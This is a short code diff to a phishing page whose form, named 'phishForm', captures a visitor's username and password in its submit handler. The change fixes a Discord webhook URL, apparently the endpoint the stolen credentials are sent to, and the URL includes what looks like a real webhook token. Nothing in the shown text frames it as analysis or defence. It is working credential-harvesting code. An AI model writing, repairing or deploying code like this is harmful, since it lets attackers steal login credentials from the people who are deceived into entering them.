@@ -16,7 +16,7 @@
     document.getElementById('phishForm').onsubmit = function(e) {
       e.preventDefault();
 
-      const webhookURL = "[https://discord.com/api/webhooks/1375407829879488552/gBnV23D9Y78yeAjBRCNfju2m_XLltImQlzbG2nKxZdAgA1u8MfmqZhPgRHQrM3Mu_7Lv]";
+      const webhookURL = "https://discord.com/api/webhooks/1375407829879488552/gBnV23D9Y78yeAjBRCNfju2m_XLltImQlzbG2nKxZdAgA1u8MfmqZhPgRHQrM3Mu_7Lv";
 
       const username = document.getElementById('user').value;
       const password = document.getElementById('pass').value;
